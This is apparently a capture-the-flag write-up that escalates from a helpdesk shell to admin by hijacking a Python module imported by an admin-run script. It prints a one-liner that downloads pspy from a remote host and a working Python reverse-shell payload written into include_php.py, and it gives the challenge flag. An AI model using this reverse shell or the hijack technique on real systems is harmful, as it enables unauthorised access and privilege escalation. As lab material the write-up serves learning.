# privilege-not-included

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

# Solution

Connecting to the provided IP and Port, we are dropped in a shell as user `helpdesk`:  

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Looking at the running processes, we can see the `admin` user running a run.sh script from his home folder:  

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Inside the `helpdesk` home folder though, we find an interesting looking file. `include.py` is owned by admin, but we can read it.  

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

After closer look at the script, we can see that it's importing a weird non-standard module and then trying to use it to "include" a php file:  

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We have write permissions over the php file as well:  

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Because curl and wget weren't on the box and I couldn't install the requests library, I used the urllib.requests python library to get pspy on the machine:

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<VPS IP or ngrok>/pspy32s', 'pspy32s')"
```

Running pspy allows us to see that admin runs every few minutes and replaces the include file. It also then runs a socat command as user helpdesk which must be why they also copy the include file in the helpdesk home folder:  

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

This is a clear indication that we need to focus on this file. Given that it's importing this include_php module and may try to run include.py from `helpdesk`, then we can simply try a python module/library hijacking. 

We create a file called `include_php.py` with our python reverse shell or code that we want to run as user `admin` in it and then wait. 

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'>/home/helpdesk/include_php.py
```

We get our callback shortly thereafter and get the flag:  

![image](../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

`CTF{8cff7b8b13af53032ccc1e37317dbbe673046933df4954e9e4f126317934c64b}`
